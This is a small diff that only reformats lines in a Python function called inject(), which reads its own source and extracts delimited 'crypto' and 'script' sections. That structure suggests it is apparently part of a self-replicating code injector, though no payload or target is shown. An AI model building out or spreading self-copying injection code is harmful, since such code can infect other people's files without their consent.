@@ -66,11 +66,10 @@ def inject():
     with open(__file__, "r") as injection:
         injection_text = injection.read()
 
-    injection_text = injection_text.split("# DELIMITER:END\n")[
-        0]
+    injection_text = injection_text.split("# DELIMITER:END\n")[0]
 
-    injection_crypto_text = "# DELIMITER:CRYPTO\n" + injection_text.split("# DELIMITER:CRYPTO\n")[
-        1].split("# DELIMITER:START\n")[0]
+    injection_crypto_text = "# DELIMITER:CRYPTO\n" + injection_text.split(
+        "# DELIMITER:CRYPTO\n")[1].split("# DELIMITER:START\n")[0]
 
     injection_script_text = injection_text.split("# DELIMITER:START\n")[1]
 
